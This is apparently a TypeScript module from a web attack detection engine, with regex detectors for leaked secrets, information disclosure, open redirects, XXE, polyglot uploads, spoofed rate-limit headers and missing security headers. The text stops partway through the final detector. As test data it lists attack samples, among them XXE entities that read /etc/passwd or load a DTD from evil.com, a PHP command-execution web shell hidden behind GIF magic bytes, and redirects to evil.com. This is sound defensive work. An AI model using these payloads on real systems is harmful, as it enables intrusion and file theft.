import type { InvariantClassModule, DetectionLevelResult } from '../types.js'
import { deepDecode } from '../encoding.js'

const INTERNAL_RFC1918_RE = /\b(?:10(?:\.\d{1,3}){3}|192\.168(?:\.\d{1,3}){2}|172\.(?:1[6-9]|2\d|3[0-1])(?:\.\d{1,3}){2})\b/

const SECRET_AWS_KEY_RE = /\bAKIA[0-9A-Z]{16}\b/
const SECRET_GITHUB_TOKEN_RE = /\b(?:gh[oprs]_[A-Za-z0-9_]{6,}|github_pat_[A-Za-z0-9_]{10,})\b/
const SECRET_PRIVATE_KEY_RE = /-----BEGIN (?:RSA|EC|OPENSSH) PRIVATE KEY-----/
const SECRET_STRIPE_KEY_RE = /\b(?:sk_live_[A-Za-z0-9]{3,}|rk_live_[A-Za-z0-9]{3,})\b/

const SERVER_BANNER_RE = /(?:^|\n)\s*(?:server|x-powered-by|x-generator)\s*:\s*(?:apache\/\d|nginx\/\d|php\/\d|express\s*\d|wordpress\s*\d)/im
const OPEN_REDIRECT_LOCATION_RE = /(?:^|\n)\s*location\s*:\s*(?:(?:https?:)?\/\/(?!localhost\b|127\.0\.0\.1\b|0\.0\.0\.0\b|10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[0-1])\.)[^\s]+|javascript:[^\s]+)/im
const COUPON_ABUSE_RE = /(?:\bcoupon=[^&\s]+(?:&|\s|$).{0,120}\bcoupon=[^&\s]+)|(?:\bpromo_code=[^&\s]+(?:&|\s|$).{0,120}\bdiscount\s*=\s*(?:100|[1-9]\d{2,}))|(?:\bapply_coupon=[^&\s]+(?:&|\s|$).{0,120}\bquantity\s*=\s*(?:[1-9]\d{2,}))/i
// Matches Windows paths in server/error contexts — excludes common user home paths
// like C:\Users\<name>\Documents which are benign in normal requests.
// Triggers on: server dirs (inetpub, wwwroot, Program Files, Windows, System32, etc.),
// error message prefixes, environment variable expansions, or drive letters beyond C:\Users\.
const WINDOWS_PATH_DISCLOSURE_RE = /(?:%(?:SYSTEMROOT|WINDIR|PROGRAMFILES(?:\(X86\))?|APPDATA|PROGRAMDATA)%\\[^\r\n]*|\b[A-Za-z]:\\(?:(?:inetpub|wwwroot|xampp|wamp|lamp|nginx|apache2|Program\s+Files(?:\s*\(x86\))?|Windows|WINDOWS|System32|SysWOW64|ProgramData|AppData\\Roaming\\(?!Microsoft\\Windows\\(?:Recent|Themes|Start Menu))))[^\r\n]*|\berror\s+(?:at|in|on)\b[^\r\n]*\b[A-Za-z]:\\[^\r\n]*)/i
const XXE_PARAMETER_ENTITY_RE = /<!ENTITY\s+%\s+[A-Za-z0-9._-]+\s+SYSTEM\s+["'][^"']+["']\s*>/i
const FILE_POLYGLOT_RE = /(?:GIF8[79]a[\s\S]{0,200}(?:<script\b|<\?php\b))|(?:%PDF-[\d.]+[\s\S]{0,400}<script\b)/i
const RATE_LIMIT_BYPASS_HEADER_RE = /(?:^|\n)\s*x-originating-ip\s*:\s*(?:127\.0\.0\.1|::1)\b|(?:^|\n)\s*x-real-ip\s*:\s*(?:127\.0\.0\.1|10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[0-1])\.)\d{1,3}(?:\.\d{1,3}){0,2}\b|(?:^|\n)\s*x-forwarded-for\s*:\s*(?:\d{1,3}\.){3}\d{1,3}\s*,\s*(?:\d{1,3}\.){3}\d{1,3}/im
const RESPONSE_HEADER_HTML_RE = /\btext\/(?:html|javascript)\b/i
const RESPONSE_HEADER_CONTENT_TYPE_RE = /(?:^|\n|\r)\s*content-type\s*:/i
const RESPONSE_HEADER_HTTP_RE = /\bHTTP\/\d(?:\.\d)?\b/i
const RESPONSE_HEADER_CSP_RE = /(?:^|\n|\r)\s*content-security-policy\s*:/i
const SET_COOKIE_RE = /(?:^|\n|\r)\s*set-cookie\s*:/i
const HSTS_RE = /(?:^|\n|\r)\s*strict-transport-security\s*:/i
const SECRET_IN_QUERY_RE = /[?&](?:api_key|apikey|api_token|access_token|token|secret|password|passwd|auth_token|private_key|client_secret|app_secret)\s*=\s*([^\s&#]{6,})/i
const JAVA_STACK_TRACE_RE = /\bat\s+[a-z][a-z0-9.]+\.[A-Z][A-Za-z0-9]+\.[a-zA-Z0-9_]+\s*\(/
const PY_TRACEBACK_RE = /Traceback \(most recent call last\)/i
const DOTNET_EXCEPTION_RE = /System\.[A-Z][A-Za-z]+Exception/
const JAVA_LANG_EXCEPTION_RE = /\bjava\.(?:lang|io|util)\.[A-Z][A-Za-z]+Exception/i
const GIT_EXPOSURE_RE = /(?:\/\.git\/(?:config|HEAD|index|COMMIT_EDITMSG|packed-refs|refs\/|objects\/|logs\/)|\/\.gitignore\b)/i
const DEBUG_PARAMETER_RE = /(?:^|[?&])(?:debug|_debug|trace|verbose|XDEBUG_SESSION_START|phpinfo|profiling|_profiler|xdebug)\s*=\s*(?:true|1|on|yes|start)/i
const X_FRAME_OPTIONS_RE = /(?:^|\n|\r)\s*x-frame-options\s*:/i
const FRAME_ANCESTORS_RE = /\bframe-ancestors\b/i
const DUPLICATE_QUERY_PARAM_RE = /[?&]([^=&]+)=[^&]*/g
const CORS_WILDCARD_RE = /(?:^|\n|\r)\s*(?:access-control-allow-origin|acao)\s*:\s*\*/i
const CORS_CREDENTIALS_RE = /(?:^|\n|\r)\s*(?:access-control-allow-credentials|acac)\s*:\s*true/i
const SUBDOMAIN_CNAME_PROVIDER_RE = /CNAME\s+[^\s]+\.(?:github\.io|s3\.amazonaws\.com|amazonaws\.com|herokuapp\.com|tumblr\.com|azurewebsites\.net|cloudfront\.net|fastly\.net|shopify\.com|readme\.io)/i
const SUBDOMAIN_TAKEOVER_ERROR_RE = /(NoSuchBucket|No such app|Not Found|404|There is no app|project not found)/i
const NEGATIVE_NUMERIC_PARAM_RE = /(?:quantity|price|amount|count|age|limit|size)\s*=\s*-\d+/i
const LARGE_NUMERIC_PARAM_RE = /[?&][^=]+=(\d{10,})/g
const JSONP_CALLBACK_PARAM_RE = /[?&](?:callback|jsonp|cb|callbackname|jsonpcallback)\s*=\s*([^&\s]+)/i
const JSONP_UNSAFE_CALLBACK_RE = /(?:document|window|alert|fetch|eval|write|steal|evil|hack)/i
const JSONP_ALLOWED_CALLBACK_CHARS_RE = /^[A-Za-z0-9_.]+$/
const RESPONSE_HEADER_INJECTION_RE = /(?:%0[aAdD]|\r|\n|\\r|\\n|\r|\n).*?(?:[A-Za-z-]+\s*:|HTTP\/)/i

function l2FromPattern(input: string, pattern: RegExp, explanation: string): DetectionLevelResult | null {
    const decoded = deepDecode(input)
    const match = decoded.match(pattern)
    if (!match) return null
    return {
        detected: true,
        confidence: 0.88,
        explanation,
        evidence: match[0].slice(0, 160),
    }
}

export const secretAwsKey: InvariantClassModule = {
    id: 'secret_aws_key',
    description: 'Detects leaked AWS access key identifiers in request/response material',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.9 },
    mitre: ['T1552.001'],
    cwe: 'CWE-312',
    knownPayloads: [
        'AKIAIOSFODNN7EXAMPLE',
        'access_key=AKIAIOSFODNN7EXAMPLE',
        'Authorization: AWS AKIAIOSFODNN7EXAMPLE',
    ],
    knownBenign: [
        'AKIA-LOCAL-PLACEHOLDER',
        'access_key=LOCAL_ACCESS_KEY',
        'Authorization: AWS-SIGV4 region=us-east-1',
    ],
    detect: (input: string): boolean => SECRET_AWS_KEY_RE.test(deepDecode(input)),
    detectL2: (input: string): DetectionLevelResult | null => l2FromPattern(input, SECRET_AWS_KEY_RE, 'L2 secret scan matched AWS access key pattern'),
    generateVariants: (count: number): string[] => {
        const variants = [
            'AKIAIOSFODNN7EXAMPLE',
            'access_key=AKIAIOSFODNN7EXAMPLE',
            'Authorization: AWS AKIAIOSFODNN7EXAMPLE',
            'aws_access_key_id=AKIAIOSFODNN7EXAMPLE',
        ]
        return variants.slice(0, count)
    },
}

export const secretGithubToken: InvariantClassModule = {
    id: 'secret_github_token',
    description: 'Detects GitHub token leaks in headers, env blocks, and text payloads',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.9 },
    mitre: ['T1552.001'],
    cwe: 'CWE-312',
    knownPayloads: [
        'ghp_16C7e42F292c6912E7710c838347Ae178B4a',
        'Authorization: token ghp_abc123',
        'GITHUB_TOKEN=gho_16C7e42F',
    ],
    knownBenign: [
        'GITHUB_TOKEN=redacted',
        'gh_pages deployment branch',
        'token_type=bearer',
    ],
    detect: (input: string): boolean => SECRET_GITHUB_TOKEN_RE.test(deepDecode(input)),
    detectL2: (input: string): DetectionLevelResult | null => l2FromPattern(input, SECRET_GITHUB_TOKEN_RE, 'L2 secret scan matched GitHub token pattern'),
    generateVariants: (count: number): string[] => {
        const variants = [
            'ghp_16C7e42F292c6912E7710c838347Ae178B4a',
            'Authorization: token ghp_abc123',
            'GITHUB_TOKEN=gho_16C7e42F',
            'auth=github_pat_11AA22BB33CC44DD55EE',
        ]
        return variants.slice(0, count)
    },
}

export const secretPrivateKey: InvariantClassModule = {
    id: 'secret_private_key',
    description: 'Detects PEM private-key blocks that should never appear in plain traffic',
    category: 'injection',
    severity: 'critical',
    calibration: { baseConfidence: 0.95 },
    mitre: ['T1552.004'],
    cwe: 'CWE-321',
    knownPayloads: [
        '-----BEGIN RSA PRIVATE KEY-----',
        '-----BEGIN EC PRIVATE KEY-----',
        '-----BEGIN OPENSSH PRIVATE KEY-----',
    ],
    knownBenign: [
        '-----BEGIN CERTIFICATE-----',
        '-----BEGIN PUBLIC KEY-----',
        'PRIVATE KEY rotation runbook',
    ],
    detect: (input: string): boolean => SECRET_PRIVATE_KEY_RE.test(deepDecode(input)),
    detectL2: (input: string): DetectionLevelResult | null => l2FromPattern(input, SECRET_PRIVATE_KEY_RE, 'L2 secret scan matched PEM private key header'),
    generateVariants: (count: number): string[] => {
        const variants = [
            '-----BEGIN RSA PRIVATE KEY-----',
            '-----BEGIN EC PRIVATE KEY-----',
            '-----BEGIN OPENSSH PRIVATE KEY-----',
            '...-----BEGIN RSA PRIVATE KEY-----...',
        ]
        return variants.slice(0, count)
    },
}

export const secretStripeKey: InvariantClassModule = {
    id: 'secret_stripe_key',
    description: 'Detects leaked Stripe live API keys and restricted live keys',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.9 },
    mitre: ['T1552.001'],
    cwe: 'CWE-312',
    knownPayloads: [
        'sk_live_51H8s7KGswlkqh0f',
        'stripe_key=rk_live_abc123',
        'Authorization: Bearer sk_live_xxx',
    ],
    knownBenign: [
        'sk_test_51H8s7KGswlkqh0f',
        'rk_test_abc123',
        'stripe publishable key pk_live_123',
    ],
    detect: (input: string): boolean => SECRET_STRIPE_KEY_RE.test(deepDecode(input)),
    detectL2: (input: string): DetectionLevelResult | null => l2FromPattern(input, SECRET_STRIPE_KEY_RE, 'L2 secret scan matched Stripe live secret key pattern'),
    generateVariants: (count: number): string[] => {
        const variants = [
            'sk_live_51H8s7KGswlkqh0f',
            'stripe_key=rk_live_abc123',
            'Authorization: Bearer sk_live_xxx',
            'api_key=sk_live_a1b2c3d4',
        ]
        return variants.slice(0, count)
    },
}

export const infoDisclosureServerBanner: InvariantClassModule = {
    id: 'info_disclosure_server_banner',
    description: 'Detects version-bearing server and framework banner disclosures in responses',
    category: 'injection',
    severity: 'low',
    calibration: { baseConfidence: 0.78 },
    mitre: ['T1592.002'],
    cwe: 'CWE-200',
    knownPayloads: [
        'Server: Apache/2.4.51 (Ubuntu)',
        'X-Powered-By: PHP/8.0.1',
        'X-Generator: WordPress 6.0',
    ],
    knownBenign: [
        'Server: cloudflare',
        'X-Powered-By: hidden',
        'Content-Type: application/json',
    ],
    detect: (input: string): boolean => SERVER_BANNER_RE.test(deepDecode(input)),
    detectL2: (input: string): DetectionLevelResult | null => l2FromPattern(input, SERVER_BANNER_RE, 'L2 response analysis matched software version disclosure in headers'),
    generateVariants: (count: number): string[] => {
        const variants = [
            'Server: Apache/2.4.51 (Ubuntu)',
            'X-Powered-By: PHP/8.0.1',
            'X-Generator: WordPress 6.0',
            'Server: nginx/1.21',
        ]
        return variants.slice(0, count)
    },
}

export const infoDisclosureInternalIp: InvariantClassModule = {
    id: 'info_disclosure_internal_ip',
    description: 'Detects RFC1918 internal network addresses exposed in response content',
    category: 'injection',
    severity: 'medium',
    calibration: { baseConfidence: 0.82 },
    mitre: ['T1590'],
    cwe: 'CWE-200',
    knownPayloads: [
        'internal server at 192.168.1.1',
        'connect to 10.0.0.5:3306',
        'upstream: 172.16.0.10',
    ],
    knownBenign: [
        'public endpoint 8.8.8.8',
        'connect to 172.15.0.10',
        'loopback 127.0.0.1 is local',
    ],
    detect: (input: string): boolean => INTERNAL_RFC1918_RE.test(deepDecode(input)),
    detectL2: (input: string): DetectionLevelResult | null => l2FromPattern(input, INTERNAL_RFC1918_RE, 'L2 response analysis matched internal RFC1918 address disclosure'),
    generateVariants: (count: number): string[] => {
        const variants = [
            'internal server at 192.168.1.1',
            'connect to 10.0.0.5:3306',
            'upstream: 172.16.0.10',
            'backend=10.10.10.10',
        ]
        return variants.slice(0, count)
    },
}

export const openRedirectHeaderInjection: InvariantClassModule = {
    id: 'open_redirect_header_injection',
    description: 'Detects unvalidated Location redirects to external schemes/domains',
    category: 'injection',
    severity: 'medium',
    calibration: { baseConfidence: 0.83 },
    mitre: ['T1566.002'],
    cwe: 'CWE-601',
    knownPayloads: [
        'Location: //evil.com',
        'Location: https://evil.com',
        'Location: javascript:alert(1)',
    ],
    knownBenign: [
        'Location: /login',
        'Location: /welcome',
        'Content-Location: /static/app.js',
    ],
    detect: (input: string): boolean => OPEN_REDIRECT_LOCATION_RE.test(deepDecode(input)),
    detectL2: (input: string): DetectionLevelResult | null => l2FromPattern(input, OPEN_REDIRECT_LOCATION_RE, 'L2 header analysis matched unvalidated external Location redirect'),
    generateVariants: (count: number): string[] => {
        const variants = [
            'Location: //evil.com',
            'Location: https://evil.com',
            'Location: javascript:alert(1)',
            'Location: http://evil.com/phish',
        ]
        return variants.slice(0, count)
    },
}

export const couponAbuseIndicator: InvariantClassModule = {
    id: 'coupon_abuse_indicator',
    description: 'Detects coupon stacking/replay patterns that indicate pricing manipulation attempts',
    category: 'injection',
    severity: 'medium',
    calibration: { baseConfidence: 0.8 },
    mitre: ['T1565'],
    cwe: 'CWE-840',
    knownPayloads: [
        'coupon=SAVE100&coupon=FREESHIP&coupon=EXTRA20',
        'promo_code=BLACKFRIDAY&discount=100',
        'apply_coupon=FREE100&quantity=1000',
    ],
    knownBenign: [
        'coupon=SAVE10',
        'promo_code=WELCOME&discount=10',
        'quantity=2&apply_coupon=SPRING',
    ],
    detect: (input: string): boolean => COUPON_ABUSE_RE.test(deepDecode(input)),
    detectL2: (input: string): DetectionLevelResult | null => l2FromPattern(input, COUPON_ABUSE_RE, 'L2 business-logic analysis matched coupon stacking/replay pattern'),
    generateVariants: (count: number): string[] => {
        const variants = [
            'coupon=SAVE100&coupon=FREESHIP&coupon=EXTRA20',
            'promo_code=BLACKFRIDAY&discount=100',
            'apply_coupon=FREE100&quantity=1000',
            'coupon=A&coupon=B',
        ]
        return variants.slice(0, count)
    },
}

export const pathDisclosureWindows: InvariantClassModule = {
    id: 'path_disclosure_windows',
    description: 'Detects leaked Windows filesystem paths in error responses and logs',
    category: 'injection',
    severity: 'low',
    calibration: { baseConfidence: 0.8 },
    mitre: ['T1592'],
    cwe: 'CWE-200',
    knownPayloads: [
        'C:\\inetpub\\wwwroot\\app.php',
        'error at D:\\Projects\\app\\src',
        '%SYSTEMROOT%\\system32',
    ],
    knownBenign: [
        '/var/www/html/app.php',
        'https://example.com/C:/docs',
        'systemroot variable missing',
    ],
    detect: (input: string): boolean => WINDOWS_PATH_DISCLOSURE_RE.test(deepDecode(input)),
    detectL2: (input: string): DetectionLevelResult | null => l2FromPattern(input, WINDOWS_PATH_DISCLOSURE_RE, 'L2 response analysis matched leaked Windows filesystem path'),
    generateVariants: (count: number): string[] => {
        const variants = [
            'C:\\inetpub\\wwwroot\\app.php',
            'error at D:\\Projects\\app\\src',
            '%SYSTEMROOT%\\system32',
            'Exception in E:\\Service\\bin\\app.dll',
        ]
        return variants.slice(0, count)
    },
}

export const xmlExternalEntityParameter: InvariantClassModule = {
    id: 'xml_external_entity_parameter',
    description: 'Detects XML parameter entity declarations commonly used for blind XXE payloads',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.88 },
    mitre: ['T1190'],
    cwe: 'CWE-611',
    knownPayloads: [
        '<!ENTITY % file SYSTEM "file:///etc/passwd">',
        '<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">',
        '<!ENTITY % x SYSTEM "php://filter">',
    ],
    knownBenign: [
        '<!ENTITY writer "John">',
        '<!DOCTYPE note SYSTEM "note.dtd">',
        '<note><to>User</to></note>',
    ],
    detect: (input: string): boolean => XXE_PARAMETER_ENTITY_RE.test(deepDecode(input)),
    detectL2: (input: string): DetectionLevelResult | null => l2FromPattern(input, XXE_PARAMETER_ENTITY_RE, 'L2 XML analysis matched parameter-entity XXE declaration'),
    generateVariants: (count: number): string[] => {
        const variants = [
            '<!ENTITY % file SYSTEM "file:///etc/passwd">',
            '<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">',
            '<!ENTITY % x SYSTEM "php://filter">',
            '<!ENTITY % a SYSTEM "http://attacker/dtd">',
        ]
        return variants.slice(0, count)
    },
}

export const fileUploadPolyglot: InvariantClassModule = {
    id: 'file_upload_polyglot',
    description: 'Detects polyglot upload payloads that combine file magic bytes with executable/script content',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.86 },
    mitre: ['T1190'],
    cwe: 'CWE-434',
    knownPayloads: [
        'GIF89a<script>alert(1)</script>',
        'GIF87a<?php system($_GET[cmd]); ?>',
        '%PDF-1.4 <script>alert(1)</script>',
    ],
    knownBenign: [
        'GIF89a\u0000\u0001\u0002 image bytes only',
        '%PDF-1.4 plain document content',
        'multipart/form-data; boundary=abc123',
    ],
    detect: (input: string): boolean => FILE_POLYGLOT_RE.test(deepDecode(input)),
    detectL2: (input: string): DetectionLevelResult | null => l2FromPattern(input, FILE_POLYGLOT_RE, 'L2 upload analysis matched polyglot file signature/content blend'),
    generateVariants: (count: number): string[] => {
        const variants = [
            'GIF89a<script>alert(1)</script>',
            'GIF87a<?php system($_GET[cmd]); ?>',
            '%PDF-1.4 <script>alert(1)</script>',
            'GIF89a<?php echo 1; ?>',
        ]
        return variants.slice(0, count)
    },
}

export const rateLimitBypassHeader: InvariantClassModule = {
    id: 'rate_limit_bypass_header',
    description: 'Detects spoofable forwarding headers used to evade per-IP rate limiting controls',
    category: 'injection',
    severity: 'medium',
    calibration: { baseConfidence: 0.82 },
    mitre: ['T1499'],
    cwe: 'CWE-770',
    knownPayloads: [
        'X-Originating-IP: 127.0.0.1',
        'X-Real-IP: 10.0.0.1',
        'X-Forwarded-For: 127.0.0.1, 127.0.0.2, 127.0.0.3',
    ],
    knownBenign: [
        'X-Forwarded-Proto: https',
        'X-Request-ID: 8dbaf5f2',
        'X-Forwarded-For: 203.0.113.1',
    ],
    detect: (input: string): boolean => RATE_LIMIT_BYPASS_HEADER_RE.test(deepDecode(input)),
    detectL2: (input: string): DetectionLevelResult | null => l2FromPattern(input, RATE_LIMIT_BYPASS_HEADER_RE, 'L2 header analysis matched rate-limit bypass spoofing headers'),
    generateVariants: (count: number): string[] => {
        const variants = [
            'X-Originating-IP: 127.0.0.1',
            'X-Real-IP: 10.0.0.1',
            'X-Forwarded-For: 127.0.0.1, 127.0.0.2, 127.0.0.3',
            'X-Forwarded-For: 10.0.0.2, 10.0.0.3',
        ]
        return variants.slice(0, count)
    },
}

export const responseHeaderCspMissing: InvariantClassModule = {
    id: 'response_header_csp_missing',
    description: 'Missing Content-Security-Policy header in HTTP response',
    category: 'injection',
    severity: 'medium',
    calibration: { baseConfidence: 0.75 },
    mitre: ['T1059.007'],
    cwe: 'CWE-1021',
    knownPayloads: [
        'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>',
        'status: 200\ncontent-type: text/html\nset-cookie: sid=abc',
        'HTTP/1.1 200 OK\r\nContent-Type: text/javascript\r\n',
    ],
    knownBenign: [
        'content-security-policy: default-src self',
        'HTTP/1.1 204 No Content\r\n\r\n',
        'application/json response',
    ],
    detect: (input: string): boolean => {
        const decoded = deepDecode(input)
        const looksLikeHtmlResponse = RESPONSE_HEADER_HTML_RE.test(decoded)
            && (RESPONSE_HEADER_CONTENT_TYPE_RE.test(decoded) || RESPONSE_HEADER_HTTP_RE.test(decoded))
        return looksLikeHtmlResponse && !RESPONSE_HEADER_CSP_RE.test(decoded)
    },
    detectL2: (input: string): DetectionLevelResult | null => {
        const decoded = deepDecode(input)
        const looksLikeHtmlResponse = RESPONSE_HEADER_HTML_RE.test(decoded)
            && (RESPONSE_HEADER_CONTENT_TYPE_RE.test(decoded) || RESPONSE_HEADER_HTTP_RE.test(decoded))
        if (!looksLikeHtmlResponse || RESPONSE_HEADER_CSP_RE.test(decoded)) return null
        return {
            detected: true,
            confidence: 0.84,
            explanation: 'L2 response-header analysis found HTML-like response metadata without a Content-Security-Policy header',
            evidence: decoded.slice(0, 160),
        }
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nSet-Cookie: sid=abc\r\n',
            'status: 200\ncontent-type: text/javascript',
            'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>',
            'content-type: text/html\ncache-control: no-cache',
        ]
        return variants.slice(0, count)
    },
}

export const hstsMissing: InvariantClassModule = {
    id: 'hsts_missing',
    description: 'Missing Strict-Transport-Security header in HTTPS response',
    category: 'injection',
    severity: 'medium',
    calibration: { baseConfidence: 0.72 },
    mitre: ['T1557'],
    cwe: 'CWE-319',
    knownPayloads: [
        'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nSet-Cookie: session=abc\r\n',
        'content-type: text/html\nset-cookie: token=xyz',
        'set-cookie: sid=abc123\ncontent-type: text/html',
    ],
    knownBenign: [
        'strict-transport-security: max-age=31536000',
        'strict-transport-security: max-age=63072000; includeSubDomains',
        'HTTP/1.1 200 OK\r\nStrict-Transport-Security: max-age=31536000',
    ],
    detect: (input: string): boolean => {
        const decoded = deepDecode(input)
        return SET_COOKIE_RE.test(decoded)
            && !HSTS_RE.test(decoded)
            && !/localhost|127\.0\.0\.1/i.test(decoded)
    },
    detectL2: (input: string): DetectionLevelResult | null => {
        const decoded = deepDecode(input)
        if (!SET_COOKIE_RE.test(decoded) || HSTS_RE.test(decoded) || /localhost|127\.0\.0\.1/i.test(decoded)) return null
        return {
            detected: true,
            confidence: 0.8,
            explanation: 'L2 header analysis found a cookie-bearing response without Strict-Transport-Security',
            evidence: decoded.slice(0, 160),
        }
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            'HTTP/1.1 200 OK\r\nSet-Cookie: session=abc\r\nContent-Type: text/html\r\n',
            'content-type: text/html\nset-cookie: token=xyz',
            'set-cookie: sid=abc',
            'Set-Cookie: auth=1\r\nServer: nginx',
        ]
        return variants.slice(0, count)
    },
}

export const secretInRequest: InvariantClassModule = {
    id: 'secret_in_request',
    description: 'API keys, tokens, or secrets transmitted in URL query parameters',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.85 },
    mitre: ['T1552'],
    cwe: 'CWE-598',
    knownPayloads: [
        'GET /api/data?api_key=sk-live-abc123def456&user=1',
        '/endpoint?token=ghp_1234567890abcdef&action=read',
        '?secret=mysecretvalue123&debug=true',
        '?password=mypassword123&user=admin',
    ],
    knownBenign: [
        'Authorization: Bearer token123',
        '/api/data?page=1&limit=20',
        '?sort=name&order=asc',
    ],
    detect: (input: string): boolean => SECRET_IN_QUERY_RE.test(deepDecode(input)),
    detectL2: (input: string): DetectionLevelResult | null => l2FromPattern(input, SECRET_IN_QUERY_RE, 'L2 URL analysis matched secret-like credential material in query parameters'),
    generateVariants: (count: number): string[] => {
        const variants = [
            '?api_key=sk-live-abc123def456',
            '?secret=mysecretvalue123&debug=true',
            '?password=mypassword123&user=admin',
            '?client_secret=abcdef123456',
        ]
        return variants.slice(0, count)
    },
}

export const infoDisclosureStackTrace: InvariantClassModule = {
    id: 'info_disclosure_stack_trace',
    description: 'Server-side stack trace or exception details leaked to client',
    category: 'injection',
    severity: 'medium',
    calibration: { baseConfidence: 0.88 },
    mitre: ['T1592'],
    cwe: 'CWE-209',
    knownPayloads: [
        'at com.example.app.Service.method(Service.java:42)',
        'Traceback (most recent call last):\n  File "app.py", line 10',
        'System.NullReferenceException: Object reference not set',
        'java.lang.NullPointerException\n\tat org.springframework',
    ],
    knownBenign: [
        'Error: user not found',
        'Internal server error occurred',
        'Please try again later',
    ],
    detect: (input: string): boolean => {
        const decoded = deepDecode(input)
        return JAVA_STACK_TRACE_RE.test(decoded)
            || PY_TRACEBACK_RE.test(decoded)
            || DOTNET_EXCEPTION_RE.test(decoded)
            || JAVA_LANG_EXCEPTION_RE.test(decoded)
    },
    detectL2: (input: string): DetectionLevelResult | null => {
        const decoded = deepDecode(input)
        const match = decoded.match(JAVA_STACK_TRACE_RE)
            || decoded.match(PY_TRACEBACK_RE)
            || decoded.match(DOTNET_EXCEPTION_RE)
            || decoded.match(JAVA_LANG_EXCEPTION_RE)
        if (!match) return null
        return {
            detected: true,
            confidence: 0.9,
            explanation: 'L2 error-surface analysis matched framework/runtime stack trace evidence leaking internal implementation details',
            evidence: match[0].slice(0, 160),
        }
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            'at com.example.app.Service.method(Service.java:42)',
            'Traceback (most recent call last):\n  File "app.py", line 10',
            'System.NullReferenceException: Object reference not set',
            'java.lang.IllegalStateException',
        ]
        return variants.slice(0, count)
    },
}

export const gitExposure: InvariantClassModule = {
    id: 'git_exposure',
    description: 'Exposed .git directory or Git metadata files accessible via HTTP',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.92 },
    mitre: ['T1083'],
    cwe: 'CWE-538',
    knownPayloads: [
        'GET /.git/config HTTP/1.1',
        'GET /.git/HEAD HTTP/1.1',
        '/.git/COMMIT_EDITMSG',
        '/.git/refs/heads/main',
        '/.gitignore exposed at root',
    ],
    knownBenign: [
        '/api/github/webhook',
        'git commit message',
        'using git for version control',
    ],
    detect: (input: string): boolean => GIT_EXPOSURE_RE.test(deepDecode(input)),
    detectL2: (input: string): DetectionLevelResult | null => l2FromPattern(input, GIT_EXPOSURE_RE, 'L2 path analysis matched exposed Git metadata route'),
    generateVariants: (count: number): string[] => {
        const variants = [
            'GET /.git/config HTTP/1.1',
            'GET /.git/HEAD HTTP/1.1',
            '/.git/refs/heads/main',
            '/.git/objects/ab/cdef',
        ]
        return variants.slice(0, count)
    },
}

export const debugParameterAbuse: InvariantClassModule = {
    id: 'debug_parameter_abuse',
    description: 'Debug or diagnostic parameters passed in production requests',
    category: 'injection',
    severity: 'low',
    calibration: { baseConfidence: 0.7 },
    mitre: ['T1082'],
    cwe: 'CWE-215',
    knownPayloads: [
        '?debug=true&user=1',
        '?trace=1&verbose=1',
        '?_debug=on&action=list',
        '?XDEBUG_SESSION_START=1',
        '?phpinfo=1&page=home',
    ],
    knownBenign: [
        '?page=1&sort=asc',
        '?q=debug+mode+explained',
        'debug logging disabled',
    ],
    detect: (input: string): boolean => DEBUG_PARAMETER_RE.test(deepDecode(input)),
    detectL2: (input: string): DetectionLevelResult | null => l2FromPattern(input, DEBUG_PARAMETER_RE, 'L2 request analysis matched explicitly enabled debug/trace parameters'),
    generateVariants: (count: number): string[] => {
        const variants = [
            '?debug=true&user=1',
            '?trace=1&verbose=1',
            '?XDEBUG_SESSION_START=start',
            '?phpinfo=1&page=home',
        ]
        return variants.slice(0, count)
    },
}

export const csrfMissingToken: InvariantClassModule = {
    id: 'csrf_missing_token',
    description: 'State-changing request missing CSRF protection token',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.78 },
    mitre: ['T1059'],
    cwe: 'CWE-352',
    knownPayloads: [
        'POST /transfer amount=1000&to=attacker',
        'POST /account/delete user=victim',
        'POST /password/change new_password=hacked',
        'POST /settings/email email=attacker@evil.com',
    ],
    knownBenign: [
        'POST /login csrf_token=abc123&user=john',
        'POST /form _csrf=xyz&data=value',
        'GET /api/data?page=1',
    ],
    detect: (input: string): boolean => {
        const decoded = deepDecode(input)
        const isPostLike = /\bPOST\b/i.test(decoded)
        const hasStateChangeIntent = /(amount\s*=|delete\b|password\b|transfer\b)/i.test(decoded) || (isPostLike && /email\s*=/i.test(decoded))
        const hasCsrfToken = /(csrf_token|_csrf|x-csrf|__requestverificationtoken|_token\s*=)/i.test(decoded)
        return isPostLike && hasStateChangeIntent && !hasCsrfToken
    },
    detectL2: (input: string): DetectionLevelResult | null => {
        const decoded = deepDecode(input)
        const isPostLike = /\bPOST\b/i.test(decoded)
        const stateMatch = decoded.match(/(amount\s*=|delete\b|password\b|transfer\b)/i)
            || (isPostLike ? decoded.match(/email\s*=/i) : null)
        const hasCsrfToken = /(csrf_token|_csrf|x-csrf|__requestverificationtoken|_token\s*=)/i.test(decoded)
        if (!isPostLike || !stateMatch || hasCsrfToken) return null
        return {
            detected: true,
            confidence: 0.85,
            explanation: 'L2 state-change analysis found mutation-like request data without CSRF token markers',
            evidence: stateMatch[0],
        }
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            'POST /transfer amount=1000&to=attacker',
            'POST /account/delete user=victim',
            'POST /password/change new_password=hacked',
            'POST /settings/email email=attacker@evil.com',
        ]
        return variants.slice(0, count)
    },
}

export const clickjackingMissingHeader: InvariantClassModule = {
    id: 'clickjacking_missing_header',
    description: 'Response missing X-Frame-Options or CSP frame-ancestors protection',
    category: 'injection',
    severity: 'medium',
